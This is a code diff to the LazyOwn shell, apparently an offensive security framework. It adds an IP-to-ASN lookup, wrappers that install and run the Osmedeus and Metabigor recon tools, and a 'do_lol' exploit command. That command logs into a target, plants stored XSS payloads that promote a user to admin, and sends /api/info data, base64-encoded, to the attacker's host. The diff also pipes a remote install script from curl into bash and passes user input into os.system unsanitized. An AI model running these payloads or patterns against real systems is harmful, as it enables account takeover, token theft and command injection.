@@ -22,6 +22,7 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 import cmd2
 from utils import *
 
+
 class MyServer(HTTPServer):
     """
     Custom HTTP server to handle incoming connections from certutil.
@@ -53,6 +54,79 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             get_command(url, lhost)
         query_id += 1
 
+class IP2ASN:
+    def __init__(self):
+        self.as_name = {}
+        self.as_country = {}
+        self.recs = []
+
+    def open_file(self, filename):
+        """Open and parse the IP-to-ASN file."""
+        with open(filename, 'rb') as f:
+            self.open_reader(f)
+
+    def open_reader(self, reader):
+        """Parse the reader stream, handling both regular and gzipped files."""
+        if reader.read(2) == b'\x1f\x8b':
+            reader.seek(0)
+            with gzip.open(reader, 'rb') as f:
+                self._parse_file(f)
+        else:
+            reader.seek(0)
+            self._parse_file(reader)
+
+    def _parse_file(self, reader):
+        """Parse the TSV data and load it into memory."""
+        for line in reader:
+            line = line.decode('utf-8').strip()
+            parts = line.split('\t')
+            if len(parts) < 5:
+                continue
+            start_ip, end_ip, asn, country, desc = parts[:5]
+
+            if desc == "Not routed":
+                continue
+
+            try:
+                asn = int(asn)
+            except ValueError:
+                continue
+
+            if asn not in self.as_name:
+                self.as_name[asn] = desc
+                self.as_country[asn] = country
+
+            try:
+                start_ip = IPAddress(start_ip)
+                end_ip = IPAddress(end_ip)
+                self.recs.append((start_ip, end_ip, asn))
+            except ValueError:
+                continue
+
+        self.recs.sort(key=lambda x: x[0])
+
+    def as_of_ip(self, ip):
+        """Return the ASN associated with the given IP address."""
+        ip = IPAddress(ip)
+        idx = bisect.bisect_left(self.recs, (ip, ip, 0))
+        return self._rec_index_has_ip(idx - 1, ip)
+
+    def _rec_index_has_ip(self, idx, ip):
+        """Check if the given index contains the IP."""
+        if idx < 0 or idx >= len(self.recs):
+            return 0
+        start_ip, end_ip, asn = self.recs[idx]
+        if start_ip <= ip <= end_ip:
+            return asn
+        return 0
+
+    def as_name(self, asn):
+        """Get the AS name by ASN."""
+        return self.as_name.get(asn, "Unknown")
+
+    def as_country(self, asn):
+        """Get the country by ASN."""
+        return self.as_country.get(asn, "Unknown")
 class LazyOwnShell(cmd2.Cmd):
     """
     A custom interactive shell for the LazyOwn Framework.
@@ -169,7 +243,7 @@ class LazyOwnShell(cmd2.Cmd):
             startup_script='lazyscripts/startup.ls',
             include_ipy=True,
         )
-
+        self.ip2asn = IP2ASN()
         #self.persistent_history_file = os.path.join(os.getcwd(), '/LazyOwn_history.txt')
         self.completekey = 'tab' 
         self.params = {
@@ -7373,7 +7447,8 @@ class LazyOwnShell(cmd2.Cmd):
             'users.txt',
             'sslscan-singleip.sh',
             'tor.sh',
-            'payloads.txt'
+            'payloads.txt',
+            'ip2asn-v4.tsv.gz'
         ]
 
         # Path to the sessions directory
@@ -18861,6 +18936,232 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Running darkarmour with command: {darkarmour_command}")
         os.system(darkarmour_command)
         return
+
+    def do_osmedeus(self, line):
+        """
+        Executes Osmedeus scans with guided input for various scanning scenarios.
+
+        This function performs the following actions:
+        1. Verifies the presence of Osmedeus; if not installed, it clones the repository 
+        and installs the required dependencies.
+        2. Guides the user through selecting the type of scan, target, and any additional 
+        parameters needed for the scan.
+        3. Constructs and executes the appropriate Osmedeus command.
+
+        Parameters:
+        line (str): Command-line arguments for the tool. If not provided, interactive 
+                    input will be used.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        osmedeus_path = os.path.join("external", ".exploit", "osmedeus")
+        osmedeus_path = f"{path}/{osmedeus_path}"
+        osmedeus_repo = "https://github.com/j3ssie/osmedeus.git"
+        go_install_cmd = 'bash -c "bash <(curl -fsSL https://raw.githubusercontent.com/osmedeus/osmedeus-base/master/install.sh)"'
+
+        if not os.path.exists(osmedeus_path):
+            print_warn("Osmedeus is not installed. Cloning the repository and installing dependencies.")
+            os.system(f"git clone {osmedeus_repo} {osmedeus_path}")
+            os.chdir(osmedeus_path)
+            os.system(go_install_cmd)
+            print_msg("Osmedeus installation completed.")
+            os.chdir(path)
+
+        scan_types = {
+            "1": "general (default reconnaissance workflow)",
+            "2": "extensive (in-depth analysis)",
+            "3": "vuln (vulnerability scan)",
+            "4": "fast (quick summary scan)",
+            "5": "subdomain-enum (subdomain enumeration only)",
+            "6": "extensive-vuln (extensive vulnerability scan)",
+            "7": "repo-scan (static vulnerability and secret scan on repositories)",
+            "8": "cidr (scan for CIDR ranges)"
+        }
+
+        print_msg("Select the type of scan to perform:")
+        for key, description in scan_types.items():
+            print_msg(f"  {key}. {description}")
+
+        scan_choice = input("    [!] Enter the number corresponding to your choice (default: 1): ").strip() or "1"
+        flow = scan_types.get(scan_choice, "general").split()[0]
+        domain = self.params["domain"]
+        url = self.params["url"]
+        target = input(f"    [!] Enter the target (e.g., {domain}, list_of_targets.txt): ").strip() or domain
+        if not target:
+            print_warn("A target is required to execute the scan.")
+            return
+
+        additional_params = ""
+        if flow in ["cidr", "repo-scan"]:
+            if flow == "cidr":
+                additional_params = input("    [!] Enter CIDR format (e.g., 1.2.3.4/24) or leave empty for file input: ").strip()
+            elif flow == "repo-scan":
+                additional_params = input(f"    [!] Enter the repository URL {url} or folder path: ").strip() or url
+
+        osmedeus_command = f"osmedeus scan -f {flow} -t {target} {additional_params}".strip()
+        print_msg(f"Executing Osmedeus with command: {osmedeus_command}")
+        os.system(osmedeus_command)
+        return
+
+    def do_metabigor(self, line):
+        """
+        Executes Metabigor commands for OSINT and scanning tasks with guided input or predefined arguments.
+
+        This function performs the following actions:
+        1. Verifies the presence of Metabigor; if not installed, it clones the repository and installs the required dependencies.
+        2. Guides the user through selecting the type of task (IP discovery, related domains, scan, etc.), target, and additional parameters.
+        3. Constructs and executes the appropriate Metabigor command based on the user's input or the provided argument.
+
+        Parameters:
+        line (str): Command-line arguments for Metabigor. If not provided, interactive input will be used.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        metabigor_path = os.path.join("external", ".exploit", "metabigor")
+        metabigor_path = f"{path}/{metabigor_path}"
+        metabigor_repo = "https://github.com/j3ssie/metabigor.git"
+        rhost = self.params["rhost"]
+        if not os.path.exists(metabigor_path):
+            print_warn("Metabigor is not installed. Cloning the repository and installing dependencies.")
+            os.system(f"git clone {metabigor_repo} {metabigor_path}")
+            os.chdir(metabigor_path)
+            os.system("go install")
+            print_msg("Metabigor installation completed.")
+            os.chdir(path)
+
+        if line:
+            echo_command = f'echo "{line}" | metabigor net --org -o {path}/sessions/result_{line}.txt'
+            print_msg(f"Executing Metabigor with command: {echo_command}")
+            os.system(echo_command)
+            return
+
+        task_types = {
+            "1": "Discovery IP of a company/organization",
+            "2": "Discovery IP of an ASN",
+            "3": "Find related domains using certificate info",
+            "4": "Run scan with rustscan, masscan, or nmap",
+            "5": "Get IP address summary",
+            "6": "Extract Shodan IPInfo"
+        }
+
+        print_msg("Select the type of task to perform:")
+        for key, description in task_types.items():
+            print_msg(f"  {key}. {description}")
+
+        task_choice = input("    [!] Enter the number corresponding to your choice (default: 1): ").strip() or "1"
+        task = task_types.get(task_choice, "1")
+
+        if task == "Discovery IP of a company/organization":
+            target = input("    [!] Enter the organization name: ").strip()
+            command = f"echo \"{target}\" | metabigor net --org -o {path}/sessions/result_{target}.txt"
+        elif task == "Discovery IP of an ASN":
+            target = input("    [!] Enter the ASN: ").strip()
+            command = f"echo \"{target}\" | metabigor net --asn -o {path}/sessions/result_{target}.txt"
+        elif task == "Find related domains using certificate info":
+            target = input("    [!] Enter the company/organization name: ").strip()
+            command = f"echo \"{target}\" | metabigor related -s 'cert' -o {path}/sessions/result_{target}.txt"
+        elif task == "Run scan with rustscan, masscan, or nmap":
+            target = input(f"    [!] Enter the target IP/CIDR (e.g., {rhost}/24: ").strip() or f"{rhost}/24"
+            command = f"echo \"{target}\" | metabigor scan -o {path}/sessions/result_{target}.txt"
+        elif task == "Get IP address summary":
+            target = input(f"    [!] Enter the IP address {rhost}: ").strip() or rhost
+            command = f"echo \"{target}\" | metabigor ipc --json -o {path}/sessions/result_{target}.txt"
+        elif task == "Extract Shodan IPInfo":
+            target = input(f"    [!] Enter the IP address: {rhost}: ").strip() or rhost
+            command = f"echo \"{target}\" | metabigor ip -open -o {path}/sessions/result_{target}.txt"
+
+        print_msg(f"Executing Metabigor with command: {command}")
+        os.system(command)
+        return
+    
+    def do_ip2asn(self, line):
+        """Command to get ASN for a given IP address."""
+        self.ip2asn.open_file('sessions/ip2asn-v4.tsv.gz')
+        rhost = self.params["rhost"]
+        args = line.split()
+        if not args:
+            args.append(rhost)
+            print_warn("Usage: ip2asn <IP>")
+        else:
+            args[0] = rhost
+
+        ip = args[0]
+        asn = self.ip2asn.as_of_ip(ip)
+        if asn == 0:
+            print_warn(f"IP {ip} not found in any ASN records.")
+        else:
+
+            as_name = self.ip2asn.as_name.get(asn, "Unknown")
+            as_country = self.ip2asn.as_country.get(asn, "Unknown")
+            print_msg(f"IP {ip} is part of ASN {asn} ({as_name}, {as_country})")
+
+
+
+    def do_lol(self, line):
+        """
+        Exploits a target by injecting a malicious payload and collecting admin information.
+
+        This function performs the following steps:
+        1. Logs in to the application with provided credentials.
+        2. Injects a malicious payload to elevate the role of a user to 'admin.'
+        3. Executes a secondary payload to exfiltrate admin tokens by abusing '/api/info.'
+        4. Prepares for further exploitation using '/admin' and '/api/json-rpc'.
+
+        Parameters:
+        line (str): Additional parameters for the target.
+
+        Returns:
+        None
+        """
+        rhost = self.params["rhost"]
+        url = f'http://{rhost}'
+        lhost = self.params["lhost"]
+        payload = (
+            "<img src=x onerror=\"fetch('/api/update_role', {method: 'POST', headers: { 'Content-Type': 'application/json'}, "
+            "body: JSON.stringify({ 'username': 'grisun1', 'role': 'Subscribe'})})\" />"
+        )
+
+        secondary_payload = (
+            "<img src=x onerror=\"fetch('/api/info').then(response => response.text()).then(text => {"
+            f"fetch('http://{lhost}/log?' + btoa(text), {{ mode: 'no-cors' }});"
+            "})\" />"
+        )
+
+        headers = {
+            "Content-Type": "application/json"
+        }
+
+        s = requests.Session()
+        print_msg(f"Logging in and sending payload to {url}")
+        login_response = s.post(f'{url}/api/login', headers=headers, json={"username": "grisun1", "password": "Subscribe"})
+
+        if login_response.status_code == 200:
+            print_msg("Login successful. Injecting primary payload.")
+            report_response = s.post(
+                f'{url}/api/report_user',
+                headers=headers,
+                json={"username": payload}
+            )
+            print_msg(f"Primary payload response: {report_response.status_code} - {report_response.text}")
+
+            print_msg("Injecting secondary payload to exfiltrate admin tokens.")
+            secondary_response = s.post(
+                f'{url}/api/report_user',
+                headers=headers,
+                json={"username": secondary_payload}
+            )
+            print_msg(f"Secondary payload response: {secondary_response.status_code} - {secondary_response.text}")
+        else:
+            print_warn("Login failed. Unable to inject payloads.")
+
+
+
+
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
